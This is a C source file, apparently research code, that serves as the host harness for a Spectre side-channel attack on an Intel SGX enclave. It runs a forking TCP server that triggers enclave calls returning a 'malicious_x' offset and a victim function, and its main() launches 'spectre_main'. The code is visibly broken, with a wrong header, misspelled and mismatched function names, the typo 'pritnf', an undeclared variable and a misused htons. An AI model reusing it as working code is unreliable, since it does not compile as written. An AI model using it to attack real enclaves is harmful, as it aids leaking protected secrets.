/*
 * Copyright 2018 Imperial College London
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at   
 * 
 *      http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/inet.h>


#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include "enclave_u.h"
#include "enclave_init.h"
#include "MIC.h"

extern sgx_enclave_id_t global_eid;

int socket_ecall_offset(offset_out* out)
{
	size_t malicious_x;
	sgx_status_t sgx_ret = SGX_ERROR_UNEXPECTED;
	
	sgx_ret = ecall_get_offset(global_eid, &malicious_x);
	if(sgx_ret != SGX_SUCCESS){
		abort();
		return -1;
	}

	out->malicious_x = malicious_x;
	return 0;
}


int socket_ecall_victim_fucntion(victim_in* in)
{
	ecall_victim_function(global_eid, in->x, in->array2, in->array1_size);
	if(ret !=SGX_SUCCESS){
		abort();
		return -1;
	}
	return 0;
}

void socket_init( int port_num)
{
	int fd_sock, cli_sock;
	int ret;
	struct sockaddr_in addr;
	ssize_t len;
	
	fd_sock = socket(AF_INET, SOCKET_STREAM, 0);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htons (INADDR_ANY);
	addr.sin_port = htons (port_num);
	ret = bind (fd_sock, (struct sockaddr *)&addr, sizeof(addr));
	if( ret == -1){
		printf("socket listen error\n");
		close(fd_sock);
		return;
	}
	
	while(1){
		//listen
		ret = listen(fd_sock, 0);
		if(ret < 0){
			printf("Listen error\n");
			close(fd_sock);
			return;
		}

		cli_sock = accept(fd_sock, (struct sockaddr *)NULL, NULL);
		if(cli_sock == -1){
			pritnf("socket accept error\n");
			close(fd_sock);
			return ;
		}

		pid_t pid = fork();
		if(pid == -1){
			printf("fork fail\n");
			close(fd_sock);
			return;
		}
		else if(pid>0){
			//parent
			//close client socket for listening 
			close(cli_sock);
		}
		else if(pid==0){
			int req =0;

			//child
			//close parent socket to dedicate to communication
			close(fd_sock);

			len= read(cli_sock, &req, sizeof(req));
			if(len <=0){
				printf("read fail\n");
				close(cli_sock);
				exit(1);
			}

			if(req == 1){
				printf("scket_ecall_offset\n");
				offset_out out;
				ret=socket_ecall_offset(&out);
				if(ret<0){
					printf("ecall_offset_fail\n");
					close(cli_sock);
					exit(1);
					return;
				}
				write(cli_sock, &out, sizeof(out));

				close(cli_sock);
				exit(1);
			}
			else if(req == 2){
				printf("socket_ecall_victim_fucntion\n");
				victim_in in;
				socket_ecall_victim_function(&in);
				write(cli_sock, &in, sizeof(in));
				if(ret<0){
					printf("ecall_victim_fail\n");
					close(cli_sock);
					exit(1);
					return;
				}
				close(cli_sock);
				exit(1);
			}
		}
	}
	close(fd_sock);
	return;
}












/* Application entry */
int main(int argc, char *argv[])
{
    /* Initialize the enclave */
    initialize_enclave();
 
    /* Call the main attack function*/
    spectre_main(argc, argv); 

    /* Destroy the enclave */
	 destroy_enclave();

    return 0;
}

